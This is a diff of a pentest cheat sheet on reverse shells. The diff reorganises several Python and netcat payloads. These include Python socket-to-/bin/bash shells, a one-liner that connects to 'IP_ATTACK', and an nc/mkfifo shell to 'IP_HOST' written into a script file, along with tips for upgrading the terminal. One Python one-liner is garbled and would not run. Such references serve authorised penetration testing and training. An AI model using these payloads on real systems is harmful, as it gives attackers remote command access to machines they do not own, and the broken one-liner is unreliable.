@@ -3,7 +3,7 @@ title: Reverse shells 👾
 ---
 - Credits to Pentest Monkey
 - Credits to [swisskeyrepo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#lua)
-## python
+## Python
 
 ```python
 #!/usr/bin/python3
@@ -16,8 +16,11 @@ dup2(s.fileno(),0)
 dup2(s.fileno(),1)
 dup2(s.fileno(),2)
 run(["/bin/bash","-i"])
+```
 
-# It works better the second one
+- This one almost always works better
+
+```python
 import socket,subprocess,os
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -26,6 +29,18 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/bash","-i"])
+```
+
+
+```python
+...#whatever it does before
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,s.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]));'
+
+# other option
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_HOST PORT >/tmp/f" > twasBrillig.sh
+
+# other for remote
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATTACK",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ---
@@ -84,21 +99,6 @@ stty raw -echo; fg
 
 #if you are on a meterpreter
 SHELL=/bin/bash script -q /dev/null
-```
-
----
-
-## Python
-
-```python
-...#whatever it does before
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,s.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]));'
-
-# other option
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_HOST PORT >/tmp/f" > twasBrillig.sh
-
-# other for remote
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATTACK",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ---
